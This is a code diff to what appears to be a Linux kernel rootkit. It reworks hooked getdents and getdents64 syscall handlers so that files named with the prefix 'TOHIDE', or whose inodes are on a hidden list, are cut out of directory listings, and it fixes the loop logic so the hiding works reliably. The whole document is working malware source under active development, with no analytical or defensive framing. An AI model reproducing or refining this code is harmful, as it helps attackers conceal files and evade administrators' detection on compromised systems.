@@ -77,11 +77,13 @@ char prefix[6] = "TOHIDE";
 int checkName(char *name)
 {
 	int i;
-	if (strlen(prefix) > strlen(name))
+	if (strlen(prefix) > strlen(name)) {
 		return 0;
+	}
 	for (i = 0; i < strlen(prefix); i++) {
-		if (!(name[i] == prefix[i]))
+		if (!(name[i] == prefix[i])) {
 			return 0;
+		}
 	}
 	return 1;
 }
@@ -122,15 +124,24 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	if (result > 0) { // actually read some bytes
 		for (bp = 0; bp < result;) {
 			d = (struct linux_dirent *) (kdirp + bp);
-			list_for_each_entry(ptr,&hidden_files,list) {
-				if (d->d_ino == ptr->inode || checkName(d->d_name)) {
-					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
-					        result - bp - d->d_reclen);
-					result -= d->d_reclen;
-					bp -= d->d_reclen;
+			if (checkName(d->d_name)) {
+				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					result - bp - d->d_reclen);
+				result -= d->d_reclen;
+				bp -= d->d_reclen;
+			}
+			else {
+				list_for_each_entry(ptr,&hidden_files,list) {
+					if (d->d_ino == ptr->inode) {
+						memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+							result - bp - d->d_reclen);
+						result -= d->d_reclen;
+						bp -= d->d_reclen;
+						goto nextDirent;
+					}
 				}
 			}
-			bp += d->d_reclen;
+			nextDirent: bp += d->d_reclen;
 		}
 	}
 
@@ -172,15 +183,24 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	if (result > 0) { // actually read some bytes
 		for (bp = 0; bp < result;) {
 			d = (struct linux_dirent64 *) (kdirp + bp);
-			list_for_each_entry(ptr,&hidden_files,list) {
-				if (d->d_ino == ptr->inode || checkName(d->d_name)) {
-					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
-					        result - bp - d->d_reclen);
-					result -= d->d_reclen;
-					bp -= d->d_reclen;
+			if (checkName(d->d_name)) {
+				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					result - bp - d->d_reclen);
+				result -= d->d_reclen;
+				bp -= d->d_reclen;
+			}
+			else {
+				list_for_each_entry(ptr,&hidden_files,list) {
+					if (d->d_ino == ptr->inode) {
+						memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+							result - bp - d->d_reclen);
+						result -= d->d_reclen;
+						bp -= d->d_reclen;
+						goto nextDirent64;
+					}
 				}
 			}
-			bp += d->d_reclen;
+			nextDirent64: bp += d->d_reclen;
 		}
 	}
 
